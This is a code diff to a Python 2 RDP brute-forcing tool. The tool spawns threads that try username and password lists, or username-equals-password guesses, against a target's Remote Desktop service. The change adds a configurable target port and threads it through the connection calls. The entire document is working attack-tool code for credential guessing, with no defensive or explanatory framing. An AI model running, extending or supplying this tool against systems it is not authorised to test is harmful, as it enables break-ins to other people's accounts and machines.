@@ -26,6 +26,7 @@ class RDPBruteForcer():
         requiredArgs.add_argument('-P', dest = 'PasswordsFile', action ="store", help="Password file")
         requiredArgs.add_argument('-t', dest = 'threads', action = "store", type=int, default=10, help= "Amount of threads")
         requiredArgs.add_argument('-d', dest = 'Domain', action = "store",type=str, default="", help='Domain Default:""')
+        requiredArgs.add_argument('-p', dest = 'targetPort', action = "store",type=int, default=3389, help='Target Port Default:3389')
         requiredArgs.add_argument('-UeP', dest = 'uep', action = "store",type=str, default="False", help='If true test only Username==password Default:False')
         requiredArgs.add_argument('-Timeout', dest = 'timeout', action = "store", type=int, default=15, help='Timeout Time')
 
@@ -35,6 +36,7 @@ class RDPBruteForcer():
         options = parser.parse_args()
 
         self.targetIP = options.targetIP
+        self.targetPort = options.targetPort
         self.amountOfThreads = options.threads
         self.timeoutTime = options.timeout
         self.domain = options.Domain
@@ -49,23 +51,23 @@ class RDPBruteForcer():
 
     def startBrute(self):
         print "[*] {}".format(self.info)
-        print "Target is : " + self.targetIP
+        print "Target is : " + self.targetIP + ":" + str(self.targetPort)
         if self.uep == "False":
             for username in self.usernames:
                 for password in self.passwords:
-                   self.connectRDP(username, password, self.targetIP, self.domain)
+                   self.connectRDP(username, password, self.targetIP, self.targetPort, self.domain)
                    if self.currentThreadCount == self.amountOfThreads:
                        self.currentThreadResults()
             self.currentThreadResults()
         else:
             for username in self.usernames:
-                self.connectRDP(username,username,self.targetIP,self.domain)
+                self.connectRDP(username,username,self.targetIP,self.targetPort,self.domain)
                 if self.currentThreadCount == self.amountOfThreads:
                     self.currentThreadResults()
             self.currentThreadResults()
                 
-    def connectRDP(self, username, password, targetIP, domain):
-        connect = Connect(username,password,targetIP, domain)
+    def connectRDP(self, username, password, targetIP, targetPort, domain):
+        connect = Connect(username,password,targetIP, targetPort, domain)
         connect.start()
         self.connections.append(connect)
         self.currentThreadCount += 1
@@ -96,18 +98,19 @@ class RDPBruteForcer():
 
 class Connect(Thread):
        
-      def __init__(self,username,password,targetIP, domain):
+      def __init__(self,username,password,targetIP,targetPort, domain):
 
            super(Connect, self).__init__()
 
            self.username=username
            self.password = password
            self.targetIP = targetIP
+           self.targetPort = targetPort
            self.domain = domain
            self.status = 0
 
       def run(self):
-            self.status = clientConnect(self.targetIP,self.username,self.password,self.domain, False)
+            self.status = clientConnect(self.targetIP,self.targetPort,self.username,self.password,self.domain, False)
             
 if __name__ == '__main__':
     rdpBruteForce = RDPBruteForcer()
